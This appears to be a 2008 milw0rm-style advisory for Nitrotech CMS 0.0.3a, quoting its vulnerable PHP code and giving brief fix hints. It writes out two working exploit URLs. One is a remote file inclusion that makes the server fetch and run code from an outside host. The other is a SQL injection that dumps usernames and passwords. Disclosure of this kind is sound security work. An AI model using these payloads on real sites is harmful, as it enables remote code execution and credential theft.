@@ -1,0 +1,57 @@
+Name:     Nitrotech 0.0.3a Multiple Remote Vulnerabilities
+Download: http://sourceforge.net/project/downloading.php?groupname=nitrotech&filename=nitrotech_003a.zip&use_mirror=garr
+Author:   Osirys, thanks to x0r
+Contact:  osirys@live.it 
+
+Nitrotech cms is vulnerable to multiple vulnerabilities, like remote file inclusion and sql injection.
+
+#### Remote File Inclusion Vulnerability
+
+The first bug, the remote file inclusion, is caused becouse of an include of a non declarated variable.
+Let's see the code.
+
+File: /[path]/includes/common.php
+
+[code]
+<?php
+
+session_start();
+$SID = session_id();
+
+	include($root . "config.php");
+# OTHER CODE
+[/code]
+
+## EXPLOIT:
+    http://localhost/[path]/includes/common.php?root=http://oursite.it/phpcode.txt??
+##
+
+As we can see, it's included a non declareted variable -> $root.
+To fix this bug, we could just define this variable.
+
+#### Sql Injection Vulnerability
+
+Note: In the source there could be other sql injection, just found them by yourself if you are intersted !
+
+This vulnerability is caused becouse of a direct use in a query of a get variable. To avoid this vulnerability
+we could filtered the variable, for example with an int().
+
+File: /[path]/members.php
+
+[code]
+	if($page_mode == 'view_user')
+    {
+	    $query1 = "SELECT * FROM " . $table['users'] . " WHERE id = '" . $_GET['id'] . "'";
+	    $result1 = mysql_query($query1);
+# OTHER CODE
+[/code]
+
+## EXPLOIT:
+    http://localhost/[path]/members.php?id=' union all select 1,concat_ws(0x3a3a,id,username,0x3a3a,password),3,4,5,6,7,8,9,10,11,12 from nitrotech_users/*&mode=view_user&
+##
+
+As we can see, The 'id' variable comes directly from get. So we can inject our hell code.
+
+####
+
+# milw0rm.com [2008-11-24]
